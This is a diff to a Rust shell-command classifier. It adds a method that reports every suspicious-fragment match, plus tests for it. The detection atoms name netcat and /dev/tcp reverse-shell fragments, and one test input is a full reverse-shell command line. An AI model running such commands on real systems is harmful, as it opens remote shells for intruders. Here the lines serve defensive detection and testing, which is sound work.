@@ -19,8 +19,8 @@
 //!   - Keeps the precise regex layer for "I'm sure this is bad"
 //!     verdicts at high confidence; the AtomMatcher is "this
 //!     command contains a suspicious fragment" at medium
-//!     confidence. The V2-J threat-level accumulator combines
-//!     them.
+//!     confidence. V2-J's accumulator (`Classifier::classify`)
+//!     combines them via `1 - prod(1 - p_i)`.
 
 use crate::protocol::{Category, ClassifyResult, Verdict};
 use aho_corasick::{AhoCorasick, AhoCorasickBuilder, MatchKind};
@@ -98,6 +98,31 @@ impl AtomMatcher {
             byte_offset: m.start(),
             byte_end: m.end(),
         })
+    }
+
+    /// Walk the input for ALL non-overlapping atom hits. Used by
+    /// V2-J's accumulator — multiple atoms in a single command
+    /// combine via independent-probability math (1 - prod(1-p)),
+    /// so each hit needs to be visible. The underlying iterator
+    /// is `LeftmostLongest`, so overlapping atoms resolve to the
+    /// longest at each match position (e.g. `nc -e /bin/sh` wins
+    /// over `nc -e` at the same offset).
+    pub fn find_all(&self, input: &str) -> Vec<AtomHit> {
+        self.ac
+            .find_iter(input)
+            .map(|m| {
+                let atom = self
+                    .atoms
+                    .get(m.pattern().as_usize())
+                    .copied()
+                    .expect("aho-corasick pattern id out of bounds of self.atoms — invariant broken");
+                AtomHit {
+                    atom,
+                    byte_offset: m.start(),
+                    byte_end: m.end(),
+                }
+            })
+            .collect()
     }
 
     /// Convert an atom hit into a daemon verdict. Confidence is
@@ -206,6 +231,28 @@ mod tests {
         // coincide. Ensures we hand the SLM the most-specific
         // matched substring.
         assert_eq!(hit.atom, "nc -e /bin/sh");
+    }
+
+    #[test]
+    fn matcher_find_all_returns_every_non_overlapping_hit() {
+        // V2-J: the accumulator needs every atom that fired,
+        // not just the first. Two distinct atoms at different
+        // offsets both surface.
+        let m = AtomMatcher::with_atoms(vec!["nc -e", "/dev/tcp/"]);
+        let hits = m.find_all("bash -i >& /dev/tcp/10.0.0.1/4444 && nc -e /bin/sh");
+        assert_eq!(hits.len(), 2);
+        let atoms: Vec<&str> = hits.iter().map(|h| h.atom).collect();
+        assert!(atoms.contains(&"/dev/tcp/"));
+        assert!(atoms.contains(&"nc -e"));
+        // Offsets must point INTO the input and be in source order.
+        assert!(hits[0].byte_offset < hits[1].byte_offset);
+    }
+
+    #[test]
+    fn matcher_find_all_clean_command_is_empty() {
+        let m = AtomMatcher::new();
+        assert!(m.find_all("ls -la").is_empty());
+        assert!(m.find_all("").is_empty());
     }
 
     #[test]
